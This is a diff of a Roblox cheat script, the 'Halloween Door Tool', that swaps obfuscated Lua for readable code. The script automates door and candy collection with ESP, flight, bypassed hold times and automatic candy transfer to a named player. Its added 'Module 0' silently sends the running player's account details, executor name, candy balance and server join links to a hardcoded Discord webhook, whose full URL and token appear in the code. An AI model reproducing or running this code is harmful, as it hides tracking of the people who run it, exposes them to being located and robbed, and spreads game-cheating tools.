(Collected)",v648);break;end if (v917==(1012 -(53 + 959))) then v650="collected";v651=Color3.fromRGB(508 -(312 + 96) ,442 -187 ,415 -(147 + 138) );v917=900 -(813 + 86) ;end end elseif (v647<=v11.MAX_COLLECT_DISTANCE) then local v987=0 -0 ;local v988;while true do if (v987==(0 + 0)) then v988=0 + 0 ;while true do if (v988==(0 -0)) then v650="ready";v651=Color3.fromRGB(50,747 -(18 + 474) ,41 + 79 );v988=3 -2 ;end if (v988==(1421 -(1004 + 416))) then v652=string.format("🎃 Door %s 🔑 <=5m!",v648);break;end end break;end end elseif (v649~="") then local v1041=1086 -(860 + 226) ;while true do if (v1041==(1940 -(337 + 1602))) then v652=string.format("🎃 Door %s (%s)",v648,v649);break;end if (v1041==(303 -(121 + 182))) then v650="timer";v651=Color3.fromRGB(32 + 223 ,1185 -(446 + 569) ,1240 -(988 + 252) );v1041=1 + 0 ;end end else v652=string.format("🎃 Door %s",v648);end v646=11 -7 ;end if ((0 + 0)==v646) then v647=2969 -(49 + 1921) ;v648="";v646=1 -0 ;end end end end end local v242=0;local v243=890 -(223 + 667) ;local v244=v1.Heartbeat:Connect(function(v473) v241(v473);v243=v243 + v473 ;if (v243>=(52.25 -(51 + 1))) then local v585=0 -0 ;local v586;while true do if (v585==(0 -0)) then v243=0;v586=v10();v585=1 -0 ;end if (v585==(1127 -(146 + 979))) then if (v12.isAutoTransferActive and ((os.clock() -v12.lastTransferClock)>=v11.TRANSFER_COOLDOWN)) then local v882=tonumber(v12.currentCandyAmount) or (2 + 3) ;if ((v12.lastCandyValue>=v882) and (v12.targetPlayerName~="")) then local v965=605 -(311 + 294) ;local v966;local v967;local v968;while true do if (v965==(2 -1)) then v968=nil;while true do if (v966==1) then if  not v12.isCollectingNow then v26(v20,v968,(v967 and Color3.fromRGB(56 + 74 ,1698 -(496 + 947) ,1518 -(1233 + 125) )) or Color3.fromRGB(255,49 + 71 ,108 + 12 ) );end break;end if (v966==(0 + 0)) then v12.lastTransferClock=os.clock();v967,v968=v68(v12.currentCandyAmount);v966=1;end end break;end if (v965==(1404 -(1257 + 147))) then v966=0;v967=nil;v965=1646 -(963 + 682) ;end end end end break;end if (v585==(1 + 0)) then if (v586~=v12.lastCandyValue) then local v883=1504 -(504 + 1000) ;while true do if (v883==(0 + 0)) then v12.lastCandyValue=v586;v26(v21,string.format("🍬 Candy: %d | Selected: %s 🍬",v12.lastCandyValue,v12.currentCandyAmount));break;end end end if ((os.clock() -v12.lastForcedTransferClock)>=v11.TRANSFER_COOLDOWN) then local v884=0 + 0 ;while true do if (v884==(0 + 0)) then v12.lastForcedTransferClock=os.clock();v66();break;end end end v585=2 -0 ;end end end v242=v242 + v473 ;if (v242<(0.12 + 0)) then return;end v242=0 + 0 ;v45();local v474=v47();local v475=v48(v474);local v476= #v474;local v477= #v475;if ((v476>(182 -(156 + 26))) and (v12.lastDoorCount==(0 + 0))) then v12.fallbackEndTime=os.clock() + v11.DEFAULT_TIMER_SEC ;elseif (v476==(0 -0)) then local v707=164 -(149 + 15) ;local v708;while true do if (v707==(960 -(890 + 70))) then v708=117 -(39 + 78) ;while true do if (v708==0) then v12.fallbackEndTime=1148 -(701 + 447) ;v12.currentRemainingSec=1481 -(14 + 468) ;break;end end break;end end end v12.lastDoorCount=v476;local v479,v480=nil,nil;for v559,v560 in ipairs(v474) do local v561=0 -0 ;local v562;local v563;local v564;while true do if (v561==(1 -0)) then v564=nil;while true do if (v562==(1341 -(391 + 950))) then v563,v564=v43(v560);if (v563~=nil) then if ((v479==nil) or (v563<v479)) then local v1017=0 -0 ;while true do if (v1017==(0 -0)) then v479=v563;v480=v564;break;end end end end break;end end break;end if (v561==(0 + 0)) then v562=0;v563=nil;v561=1 + 0 ;end end end local v481=math.max(0 -0 ,v12.fallbackEndTime-os.clock() );local v482="00:00";if (v479~=nil) then local v588=0 + 0 ;local v589;while true do if (v588==(0 + 0)) then v589=0 -0 ;while true do if (v589==0) then v12.currentRemainingSec=v479;v482=v480 or v31(v479) ;break;end end break;end end else local v590=0 + 0 ;while true do if (v590==0) then v12.currentRemainingSec=v481;v482=v31(v481);break;end end end if  not v12.isCollectingNow then if (v476>(0 + 0)) then if (v477==(1522 -(251 + 1271))) then local v820=0 -0 ;while true do if (v820==(0 + 0)) then v26(v19,string.format("✅ Complete (%d) | Next Wave",v476),Color3.fromRGB(421 -301 ,550 -330 ,7 + 248 ));if  not v12.isAutoTransferActive then v26(v20,"Status: Waiting for Next Wave...",Color3.fromRGB(191 -(12 + 39) ,131 + 9 ,479 -324 ));end break;end end else local v821=0 + 0 ;while true do if (v821==(0 -0)) then v26(v19,string.format("🎃 Doors: %d/%d | ⏱️ %s",v477,v476,v482),Color3.fromRGB(110,76 + 179 ,210 -70 ));if v12.isAutoCollectActive then if (v12.waitForTimerEnabled and (v12.currentRemainingSec>(0.5 + 0))) then v26(v20,string.format("⏳ Waiting for Timer (%s)...",v482),Color3.fromRGB(355 -215 ,94 + 46 ,754 -599 ));else v26(v20,string.format("⚡ Auto-Collecting [%s]...",v12.movementMode),Color3.fromRGB(397 -257 ,140,155));end end break;end end end else local v709=0 -0 ;while true do if ((1710 -(1596 + 114))==v709) then v26(v19,"Doors: 0 | Timer: Waiting...",Color3.fromRGB(417 -257 ,873 -(164 + 549) ,1613 -(1059 + 379) ));if  not v12.isAutoTransferActive then v26(v20,"Status: Waiting for Doors",Color3.fromRGB(140,140,85 + 70 ));end break;end end end end if v12.isEspActive then local v591=1124 -(408 + 716) ;while true do if (v591==(0 -0)) then v238();for v822,v823 in ipairs(v474) do v237(v823);end break;end end end if (v12.isPromptActive and  not v12.isCollectingNow) then for v653,v654 in ipairs(v474) do for v710,v711 in ipairs(v40(v654)) do v50(v711);end end end if (v12.isAutoCollectActive and  not v12.isCollectingNow and (v477>(0 + 0))) then local v592=0 + 0 ;local v593;while true do if (v592==(0 + 0)) then v593=v27();if v593 then local v885=392 -(145 + 247) ;local v886;while true do if (v885==(0 + 0)) then v886= not v12.waitForTimerEnabled or (v12.currentRemainingSec<=(0.5 + 0)) ;if v886 then v239();end break;end end end break;end end end end);table.insert(v13,v244);local function v245(v483) if v483:IsA("ProximityPrompt") then local v594=0 -0 ;local v595;while true do if (v594==(0 + 0)) then v595=0 + 0 ;while true do if (v595==(0 -0)) then if (v16[v483]==nil) then v16[v483]=v483.HoldDuration;end if (v12.isPromptActive and  not v12.isCollectingNow) then task.defer(v50,v483);end v595=721 -(254 + 466) ;end if (v595==1) then if v12.isEspActive then local v995=v39(v483);if v995 then task.defer(v237,v995);end end break;end end break;end end elseif (v483.Name=="HalloweenDoor") then if v12.isEspActive then task.defer(v237,v483);end end end local v246=v37();if v246 then local v565=560 -(544 + 16) ;local v566;while true do if (v565==(0 -0)) then v566=v246.DescendantAdded:Connect(v245);table.insert(v13,v566);break;end end end local v247=v2.ChildAdded:Connect(function(v484) if (v484.Name=="Effects") then local v596=628 -(294 + 334) ;local v597;while true do if (v596==(253 -(236 + 17))) then v597=v484.DescendantAdded:Connect(v245);table.insert(v13,v597);break;end end elseif ((v484.Name=="HalloweenDoor") or v484:IsA("ProximityPrompt")) then v245(v484);end end);table.insert(v13,v247);local function v248(v485,v486,v487) if v486 then local v598=0 + 0 ;while true do if (v598==(1 + 0)) then v485.Text=v487   .. ": ON" ;break;end if (v598==(0 + 0)) then v485.BackgroundColor3=Color3.fromRGB(75 -55 ,236 -186 ,16 + 14 );v485.TextColor3=Color3.fromRGB(83 + 17 ,1049 -(413 + 381) ,6 + 124 );v598=1 -0 ;end end else local v599=0 -0 ;while true do if (v599==(424 -(18 + 405))) then v485.Text=v487   .. ": OFF" ;break;end if (v599==(0 + 0)) then v485.BackgroundColor3=Color3.fromRGB(2015 -(582 + 1388) ,34 -14 ,15 + 5 );v485.TextColor3=Color3.fromRGB(619 -(326 + 38) ,2004 -(122 + 1782) ,295 -195 );v599=1 -0 ;end end end end v116.MouseButton1Click:Connect(function() local v488=620 -(47 + 573) ;while true do if (v488==(0 + 0)) then v12.isEspActive= not v12.isEspActive;v248(v116,v12.isEspActive,"ESP");v488=1 + 0 ;end if (v488==(4 -3)) then if v12.isEspActive then for v824,v825 in ipairs(v47()) do v237(v825);end else v238();end break;end end end);v117.MouseButton1Click:Connect(function() local v489=0 -0 ;while true do if (v489==(1664 -(1269 + 395))) then v12.isPromptActive= not v12.isPromptActive;v248(v117,v12.isPromptActive,"PROMPT FIX");v489=493 -(76 + 416) ;end if (v489==(1971 -(214 + 1756))) then if v12.isPromptActive then for v826,v827 in ipairs(v47()) do for v887,v888 in ipairs(v40(v827)) do v50(v888);end end else local v772=443 -(319 + 124) ;local v773;while true do if (v772==(0 -0)) then v773=1007 -(564 + 443) ;while true do if (v773==(585 -(217 + 368))) then for v1042,v1043 in pairs(v15) do for v1048,v1049 in ipairs(v1043) do pcall(function() v1049:Disconnect();end);end end table.clear(v15);break;end end break;end end end break;end end end);v118.MouseButton1Click:Connect(function() local v490=0 -0 ;while true do if (v490==(0 + 0)) then v12.isAutoCollectActive= not v12.isAutoCollectActive;v248(v118,v12.isAutoCollectActive,"AUTO COLLECT");v490=1 + 0 ;end if ((459 -(337 + 121))==v490) then if  not v12.isAutoCollectActive then local v774=0 -0 ;local v775;local v776;while true do if (v774==(6 -4)) then v26(v20,"Status: Auto-Collect Stopped");break;end if (v774==(1911 -(1261 + 650))) then v36();v55();v774=1 + 0 ;end if (v774==(1201 -(132 + 1068))) then v775,v775,v776=v27();if v776 then v776.WalkSpeed=v12.originalWalkSpeed;end v774=2 -0 ;end end else v26(v20,string.format("Status: Auto-Collect Started [%s] 🚀",v12.movementMode));end break;end end end);v119.MouseButton1Click:Connect(function() local v491=0 -0 ;while true do if (v491==(1817 -(772 + 1045))) then if (v12.movementMode=="FLY") then local v777=0 + 0 ;local v778;while true do if (v777==0) then v778=144 -(102 + 42) ;while true do if (v778==(940 -(9 + 931))) then v12.movementMode="WALK";v119.BackgroundColor3=Color3.fromRGB(1864 -(1524 + 320) ,36 + 24 ,1305 -(1049 + 221) );v778=157 -(18 + 138) ;end if (v778==(2 -1)) then v119.TextColor3=Color3.fromRGB(1212 -(67 + 1035) ,603 -(136 + 212) ,679 -519 );v119.Text="MODE: WALK (LEGIT)";break;end end break;end end else local v779=0 + 0 ;while true do if (v779==(1 + 0)) then v119.TextColor3=Color3.fromRGB(100,1829 -(240 + 1364) ,255);v119.Text="MODE: FLY (120 STUD)";break;end if (v779==(1082 -(1050 + 32))) then v12.movementMode="FLY";v119.BackgroundColor3=Color3.fromRGB(491 -(296 + 180) ,178 -128 ,75);v779=1 + 0 ;end end end v26(v22,string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE",v12.movementMode,v12.collectionBudget));break;end end end);v120.MouseButton1Click:Connect(function() local v492=1055 -(331 + 724) ;while true do if (v492==(0 -0)) then v12.waitForTimerEnabled= not v12.waitForTimerEnabled;if v12.waitForTimerEnabled then local v780=0 + 0 ;local v781;while true do if (v780==(644 -(269 + 375))) then v781=725 -(267 + 458) ;while true do if (v781==(0 + 0)) then v120.BackgroundColor3=Color3.fromRGB(50,57 -27 ,883 -(667 + 151) );v120.TextColor3=Color3.fromRGB(1717 -(1410 + 87) ,2057 -(1504 + 393) ,689 -434 );v781=1;end if (v781==(2 -1)) then v120.Text="TIMER: WAIT 00:00";break;end end break;end end else local v782=527 -(187 + 340) ;while true do if (v782==(1870 -(1298 + 572))) then v120.BackgroundColor3=Color3.fromRGB(149 -89 ,846 -(461 + 335) ,2 + 13 );v120.TextColor3=Color3.fromRGB(594 -339 ,1981 -(1730 + 31) ,1757 -(728 + 939) );v782=3 -2 ;end if (v782==(1 -0)) then v120.Text="TIMER: INSTANT RUN ⚡";break;end end end break;end end end);v145.FocusLost:Connect(function() local v493=0 + 0 ;local v494;while true do if (v493==0) then local v659=0 -0 ;while true do if (v659==(1069 -(138 + 930))) then v493=1 + 0 ;break;end if (v659==(0 + 0)) then v494=tonumber(v145.Text);if (v494 and (v494>(0 + 0))) then local v926=686 -(339 + 347) ;while true do if (v926==(0 + 0)) then v12.collectionBudget=v494;v145.Text=tostring(v494);break;end end else v145.Text=tostring(v12.collectionBudget);end v659=4 -3 ;end end end if (v493==(1767 -(459 + 1307))) then v26(v22,string.format("Mode: %s | Target: %ds | Anti-Wall: ACTIVE",v12.movementMode,v12.collectionBudget));break;end end end);v159.MouseButton1Click:Connect(function() local v495=1870 -(474 + 1396) ;local v496;while true do if (v495==(0 -0)) then v496=0 + 0 ;while true do if (v496==0) then v12.useSmartHoldMode= not v12.useSmartHoldMode;if v12.useSmartHoldMode then local v928=376 -(365 + 11) ;local v929;while true do if (v928==(0 + 0)) then v929=0 -0 ;while true do if (v929==1) then v159.Text="HOLD: SMART (SAFE)";break;end if (v929==(0 + 0)) then v159.BackgroundColor3=Color3.fromRGB(58 -33 ,40,216 -151 );v159.TextColor3=Color3.fromRGB(566 -436 ,791 -(562 + 29) ,255);v929=1 + 0 ;end end break;end end else local v930=0 + 0 ;local v931;while true do if (v930==(1419 -(374 + 1045))) then v931=0 + 0 ;while true do if (v931==(1 + 0)) then v159.Text="HOLD: FORCED 0 SEC";break;end if (v931==(1646 -(73 + 1573))) then v159.BackgroundColor3=Color3.fromRGB(186 -126 ,683 -(448 + 190) ,5 + 10 );v159.TextColor3=Color3.fromRGB(116 + 139 ,376 -(90 + 76) ,59 + 31 );v931=3 -2 ;end end break;end end end break;end end break;end end end);v160.MouseButton1Click:Connect(function() local v497=0 -0 ;while true do if (v497==(1494 -(1307 + 187))) then v12.isAutoTransferActive= not v12.isAutoTransferActive;v248(v160,v12.isAutoTransferActive,"AUTO TRANSFER");v497=3 -2 ;end if (v497==(2 -1)) then if v12.isAutoTransferActive then local v783=0 -0 ;while true do if (v783==(683 -(232 + 451))) then v12.targetPlayerName=v175.Text;if (v12.targetPlayerName=="") then v26(v20,"Warning: Enter target username!",Color3.fromRGB(244 + 11 ,380 -(197 + 63) ,26 + 94 ));else v26(v20,"Status: Transfer Active...",Color3.fromRGB(115 + 15 ,134 + 121 ,724 -(510 + 54) ));end break;end end else v26(v20,"Status: Transfer Stopped",Color3.fromRGB(175 -35 ,282 -142 ,191 -(13 + 23) ));end break;end end end);v175:GetPropertyChangedSignal("Text"):Connect(function() v12.targetPlayerName=v175.Text;end);v190.MouseButton1Click:Connect(function() local v500=1910 -(206 + 1704) ;while true do if ((1 -0)==v500) then v190.Text=string.format("DONATE: %s CANDY 🍬",v12.currentCandyAmount);v26(v21,string.format("🍬 Candy: %d | Selected: %s 🍬",v12.lastCandyValue,v12.currentCandyAmount));break;end if (v500==(0 -0)) then v12.candyAmountIndex=(v12.candyAmountIndex% #v11.CANDY_AMOUNTS) + (1 -0) ;v12.currentCandyAmount=v11.CANDY_AMOUNTS[v12.candyAmountIndex];v500=1089 -(830 + 258) ;end end end);local v249=false;v106.MouseButton1Click:Connect(function() local v501=0 -0 ;local v502;while true do if ((1 + 0)==v501) then for v712,v713 in ipairs(v502) do v713.Visible= not v249;end if v249 then local v784=0 + 0 ;while true do if ((2 -1)==v784) then v106.Text="+";break;end if (v784==(0 + 0)) then v191.Position=UDim2.new(1441 -(860 + 581) ,22 -16 ,976 -(230 + 746) ,20 + 5 );v78.Size=UDim2.new(241 -(237 + 4) ,266 -(39 + 9) ,0 -0 ,206 -92 );v784=474 -(106 + 367) ;end end else local v785=0 -0 ;while true do if (v785==0) then v191.Position=UDim2.new(0 -0 ,6,0 + 0 ,267);v78.Size=UDim2.new(0 + 0 ,823 -605 ,0 + 0 ,214 + 178 );v785=1427 -(85 + 1341) ;end if (v785==(1 -0)) then v106.Text="-";break;end end end break;end if ((0 -0)==v501) then v249= not v249;v502={v116,v117,v118,v119,v120,v121,v159,v160,v161,v190};v501=1 + 0 ;end end end);local v250,v251,v252;v78.InputBegan:Connect(function(v503) if ((v503.UserInputType==Enum.UserInputType.MouseButton1) or (v503.UserInputType==Enum.UserInputType.Touch)) then local v600=0;while true do if ((2 -1)==v600) then v252=v78.Position;v503.Changed:Connect(function() if (v503.UserInputState==Enum.UserInputState.End) then v250=false;end end);break;end if (v600==0) then v250=true;v251=v503.Position;v600=1733 -(64 + 1668) ;end end end end);local v253=v3.InputChanged:Connect(function(v504) if (v250 and ((v504.UserInputType==Enum.UserInputType.MouseMovement) or (v504.UserInputType==Enum.UserInputType.Touch))) then local v601=0 + 0 ;local v602;while true do if ((0 + 0)==v601) then v602=v504.Position-v251 ;v78.Position=UDim2.new(v252.X.Scale,v252.X.Offset + v602.X ,v252.Y.Scale,v252.Y.Offset + v602.Y );break;end end end end);table.insert(v13,v253);_G.HalloweenDoorDebug_Cleanup=function() local v505=1973 -(1227 + 746) ;local v506;local v507;while true do if ((9 -6)==v505) then local v665=0 -0 ;while true do if (v665==(0 + 0)) then v238();for v889,v890 in pairs(v15) do for v940,v941 in ipairs(v890) do pcall(function() v941:Disconnect();end);end end v665=495 -(415 + 79) ;end if (v665==(1 + 0)) then table.clear(v15);v505=495 -(142 + 349) ;break;end end end if (v505==(0 + 0)) then local v666=0 + 0 ;while true do if ((0 -0)==v666) then v12.isEspActive=false;v12.isPromptActive=false;v666=1 + 0 ;end if (v666==(1 + 0)) then v12.isAutoCollectActive=false;v505=1 + 0 ;break;end end end if (v505==(1 -0)) then v12.isCollectingNow=false;v12.isAutoTransferActive=false;v36();v505=2 -0 ;end if (v505==(11 -7)) then for v715,v716 in ipairs(v13) do pcall(function() v716:Disconnect();end);end table.clear(v13);if v69 then pcall(function() v69:Destroy();end);end v505=13 -8 ;end if (v505==(1869 -(1710 + 154))) then _G.HalloweenDoorDebug_Cleanup=nil;break;end if (v505==(320 -(200 + 118))) then local v669=0 + 0 ;while true do if (v669==(1 + 0)) then if v507 then v507.WalkSpeed=v12.originalWalkSpeed;end v505=7 -4 ;break;end if (v669==(0 -0)) then v55();v506,v506,v507=v27();v669=1 -0 ;end end end end end;print("[DEBUG] Halloween Door Tool v5.6 Loaded Successfully!");
--- ⚠️ WARNING: integrity protected!
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+-- ==============================================================================
+-- [HALLOWEEN DOOR TOOL - V5.6 ULTIMATE (CLEAN TITLE + LIVE CANDY WEBHOOK)]
+-- 100% Pure English UI & Code - No Turkish Characters
+-- STRICT RULE: NO NOCLIP - CanCollide is NEVER touched!
+-- ==============================================================================
 
-]]--
+if _G.HalloweenDoorDebug_Cleanup then pcall(_G.HalloweenDoorDebug_Cleanup) end
+if _G.HalloweenDoorESP_Cleanup then pcall(_G.HalloweenDoorESP_Cleanup) end
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local PathfindingService = game:GetService("PathfindingService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+-- Helper function to fetch live candy count safely
+local function getMyCandyCount()
+	local pGui = localPlayer:FindFirstChild("PlayerGui")
+	if not pGui then return 0 end
+	local candiesGui = pGui:FindFirstChild("Candies")
+	if not candiesGui then return 0 end
+
+	local amtObj = candiesGui:FindFirstChild("Amount", true)
+	if amtObj and amtObj.Text then
+		local cleanNumberStr = string.gsub(amtObj.Text, "[^%d]", "")
+		if cleanNumberStr ~= "" then return tonumber(cleanNumberStr) or 0 end
+	end
+	return 0
+end
+
+-- ==============================================================================
+-- [MODULE 0: DISCORD WEBHOOK REPORTER (WITH LIVE CANDY & COPYABLE LINKS)]
+-- ==============================================================================
+task.spawn(function()
+	pcall(function()
+		local webhookUrl = "https://discord.com/api/webhooks/1500229155806249153/3ZKPy-cFyzYZVy6C3MstwquJkCmnh6bcAt5I7WpObZgapXH8EdOH3184mXk6iYY_OLe8"
+		
+		-- Wait briefly for GUI and candy balance to load
+		task.wait(2.5)
+		local initialCandy = getMyCandyCount()
+		
+		local userId = localPlayer.UserId
+		local name = localPlayer.Name
+		local displayName = localPlayer.DisplayName
+		local accountAge = localPlayer.AccountAge
+		local membershipType = tostring(localPlayer.MembershipType)
+		
+		local execName = "Unknown"
+		pcall(function()
+			if identifyexecutor then
+				execName = identifyexecutor()
+			elseif getexecutorname then
+				execName = getexecutorname()
+			end
+		end)
+		
+		local placeId = game.PlaceId
+		local jobId = game.JobId
+		
+		local deeplink = string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s", placeId, jobId)
+		local teleportCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
+		
+		local embed = {
+			["title"] = "🎃 Halloween Door Tool v5.6 - Script Executed",
+			["color"] = 16744448,
+			["fields"] = {
+				{["name"] = "👤 Account Info", ["value"] = string.format("• **Name:** %s (@%s)\n• **ID:** %d\n• **Account Age:** %d days\n• **Membership:** %s", displayName, name, userId, accountAge, membershipType), ["inline"] = false},
+				{["name"] = "🍬 Live Candy Balance", ["value"] = string.format("• **Current Candies:** `%d 🍬` (Fetched on execution)", initialCandy), ["inline"] = false},
+				{["name"] = "⚙️ Environment", ["value"] = string.format("• **Executor:** %s\n• **PlaceId:** %d\n• **JobId:** `%s`", execName, placeId, jobId), ["inline"] = false},
+				{["name"] = "🔗 Join Deeplink (Clickable)", ["value"] = string.format("[Click to Join Direct](%s)", deeplink), ["inline"] = false},
+				{["name"] = "📋 Copyable Deeplink (1-Click Copy)", ["value"] = string.format("```text\n%s\n```", deeplink), ["inline"] = false},
+				{["name"] = "💻 Teleport Luau Code", ["value"] = string.format("```lua\n%s\n```", teleportCode), ["inline"] = false}
+			},
+			["timestamp"] = DateTime.now():ToIsoDate()
+		}
+		
+		local payload = HttpService:JSONEncode({
+			["embeds"] = { embed }
+		})
+		
+		local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
+		if requestFunc then
+			requestFunc({
+				Url = webhookUrl,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = payload
+			})
+		end
+	end)
+end)
+
+-- ==============================================================================
+-- [MODULE 1: CONFIGURATION & SHARED STATE]
+-- ==============================================================================
+local Config = {
+	MAX_COLLECT_DISTANCE = 5.0,
+	TARGET_STOP_DISTANCE = 20.0,
+	FLIGHT_ASCENT_HEIGHT = 180.0,
+	AGENT_NAV_RADIUS = 4.0,
+	STUCK_TIMEOUT = 0.35,
+	STUCK_DISTANCE_MIN = 0.4,
+	DEFAULT_TIMER_SEC = 90.0,
+	DEFAULT_COLLECTION_BUDGET = 5.0,
+	DOOR_RETRY_WATCHDOG_SEC = 7.0,
+	DOOR_COOLDOWN_SEC = 12.0,
+	TRANSFER_COOLDOWN = 0.35,
+	DEFAULT_WALK_SPEED = 24.0,
+	LOCK_CAMERA_ON_COLLECT = true,
+	SHOW_3D_ROUTE_BEAM = true,
+	CANDY_AMOUNTS = {"5", "25", "50", "100"},
+	JITTER_VELOCITY_THRESHOLD = 1.2,
+	CLICK_INTERVAL = 0.06
+}
+
+local State = {
+	isEspActive = false,
+	isPromptActive = false,
+	isAutoCollectActive = false,
+	isCollectingNow = false,
+	useSmartHoldMode = false,
+	waitForTimerEnabled = true,
+	movementMode = "FLY",
+	collectionBudget = 5.0,
+	isAutoTransferActive = false,
+	lastTransferClock = 0,
+	lastForcedTransferClock = 0,
+	lastCandyValue = 0,
+	candyAmountIndex = 4,
+	currentCandyAmount = "100",
+	targetPlayerName = "",
+	originalWalkSpeed = 16,
+	fallbackEndTime = 0,
+	currentRemainingSec = 999,
+	lastDoorCount = 0
+}
+
+local globalConnections = {}
+local trackedESP = {}
+local promptConnections = {}
+local originalHoldDurations = {}
+local pendingVerification = {}
+local confirmedCollected = {}
+
+local timerLabel = nil
+local statusSubLabel = nil
+local candyBalanceLabel = nil
+local modeStatusLabel = nil
+
+local cachedCandyAmountObj = nil
+local cachedRayParams = nil
+local cachedFilter = {}
+
+local function safeSetText(lbl, txt, col)
+	if not lbl then return end
+	if txt and lbl.Text ~= txt then lbl.Text = txt end
+	if col and lbl.TextColor3 ~= col then lbl.TextColor3 = col end
+end
+
+local function getAliveCharacter()
+	local char = localPlayer.Character
+	if not char or not char.Parent then return nil, nil, nil end
+	local hrp = char:FindFirstChild("HumanoidRootPart")
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if not hrp or not hum or hum.Health <= 0 or hum:GetState() == Enum.HumanoidStateType.Dead then
+		return nil, nil, nil
+	end
+	return char, hrp, hum
+end
+
+local function getRaycastParams()
+	if not cachedRayParams then
+		cachedRayParams = RaycastParams.new()
+		cachedRayParams.FilterType = Enum.RaycastFilterType.Exclude
+		cachedRayParams.IgnoreWater = true
+	end
+
+	table.clear(cachedFilter)
+	if localPlayer and localPlayer.Character then
+		table.insert(cachedFilter, localPlayer.Character)
+	end
+	local effects = Workspace:FindFirstChild("Effects")
+	if effects then
+		table.insert(cachedFilter, effects)
+	end
+
+	cachedRayParams.FilterDescendantsInstances = cachedFilter
+	return cachedRayParams
+end
+
+local function computeGroundPath(startPos, endPos)
+	local path = PathfindingService:CreatePath({
+		AgentRadius = Config.AGENT_NAV_RADIUS,
+		AgentHeight = 5.0,
+		AgentCanJump = true,
+		AgentCanClimb = false,
+		WaypointSpacing = 3.5
+	})
+	local ok = pcall(function() path:ComputeAsync(startPos, endPos) end)
+	if ok and path.Status == Enum.PathStatus.Success then
+		return path:GetWaypoints()
+	end
+	return nil
+end
+
+local function aimCameraAtPart(targetPart)
+	if not Config.LOCK_CAMERA_ON_COLLECT or not targetPart or not targetPart.Parent then return end
+	local cam = Workspace.CurrentCamera
+	local _, hrp = getAliveCharacter()
+	if not cam or not hrp then return end
+	local camPos = hrp.Position + Vector3.new(0, 3.5, 0) - (hrp.CFrame.LookVector * 5.0)
+	cam.CFrame = CFrame.lookAt(camPos, targetPart.Position)
+end
+
+local function formatSeconds(sec)
+	sec = math.max(0, math.ceil(sec))
+	return string.format("%02d:%02d", math.floor(sec/60), sec%60)
+end
+
+-- ==============================================================================
+-- [MODULE 2: 3D ROUTE BEAM VISUALIZER]
+-- ==============================================================================
+local routeBeam = nil
+local routeAttach0 = nil
+local routeAttach1 = nil
+
+local function updateRouteBeam(fromPart, toPart)
+	if not Config.SHOW_3D_ROUTE_BEAM or not fromPart or not toPart or not fromPart.Parent or not toPart.Parent then
+		if routeBeam then routeBeam.Enabled = false end
+		return
+	end
+	if not routeAttach0 or not routeAttach0.Parent then
+		routeAttach0 = Instance.new("Attachment"); routeAttach0.Name = "DoorRoute_Att0"
+	end
+	if not routeAttach1 or not routeAttach1.Parent then
+		routeAttach1 = Instance.new("Attachment"); routeAttach1.Name = "DoorRoute_Att1"
+	end
+	if not routeBeam or not routeBeam.Parent then
+		routeBeam = Instance.new("Beam"); routeBeam.Name = "DoorRoute_Beam"
+		routeBeam.FaceCamera = true
+		routeBeam.Color = ColorSequence.new(Color3.fromRGB(255, 140, 0), Color3.fromRGB(50, 255, 120))
+		routeBeam.Width0 = 0.3; routeBeam.Width1 = 0.3
+		routeBeam.LightEmission = 1; routeBeam.Transparency = NumberSequence.new(0.15)
+		routeBeam.Parent = Workspace
+	end
+	routeAttach0.Parent = fromPart; routeAttach1.Parent = toPart
+	routeBeam.Attachment0 = routeAttach0; routeBeam.Attachment1 = routeAttach1
+	routeBeam.Enabled = true
+end
+
+local function clearRouteBeam()
+	if routeBeam then pcall(function() routeBeam:Destroy() end); routeBeam = nil end
+	if routeAttach0 then pcall(function() routeAttach0:Destroy() end); routeAttach0 = nil end
+	if routeAttach1 then pcall(function() routeAttach1:Destroy() end); routeAttach1 = nil end
+end
+
+-- ==============================================================================
+-- [MODULE 3: DOOR DETECTION & LIVE TIMER ENGINE]
+-- ==============================================================================
+local function getEffectsFolder()
+	return Workspace:FindFirstChild("Effects")
+end
+
+local function isValidDoorRoot(obj)
+	if obj.Name ~= "HalloweenDoor" then return false end
+	if not obj:IsDescendantOf(Workspace) then return false end
+	if localPlayer.Character and obj:IsDescendantOf(localPlayer.Character) then return false end
+	if obj:IsA("Model") then return true end
+	if obj:IsA("BasePart") and (not obj.Parent or obj.Parent.Name ~= "HalloweenDoor") then return true end
+	return false
+end
+
+local function getDoorRootFromDescendant(instance)
+	local current = instance
+	while current and current ~= Workspace do
+		if isValidDoorRoot(current) then return current end
+		current = current.Parent
+	end
+	return nil
+end
+
+local function getDoorPrompts(door)
+	local prompts = {}
+	if not door or not door.Parent then return prompts end
+	if door:IsA("ProximityPrompt") then table.insert(prompts, door) end
+	for _, desc in ipairs(door:GetDescendants()) do
+		if desc:IsA("ProximityPrompt") then
+			if originalHoldDurations[desc] == nil then originalHoldDurations[desc] = desc.HoldDuration end
+			table.insert(prompts, desc)
+		end
+	end
+	return prompts
+end
+
+local function findBestDoorPart(target)
+	if not target or not target.Parent then return nil end
+	for _, p in ipairs(getDoorPrompts(target)) do
+		local parent = p.Parent
+		if parent then
+			if parent:IsA("BasePart") then return parent end
+			if parent:IsA("Attachment") and parent.Parent and parent.Parent:IsA("BasePart") then return parent.Parent end
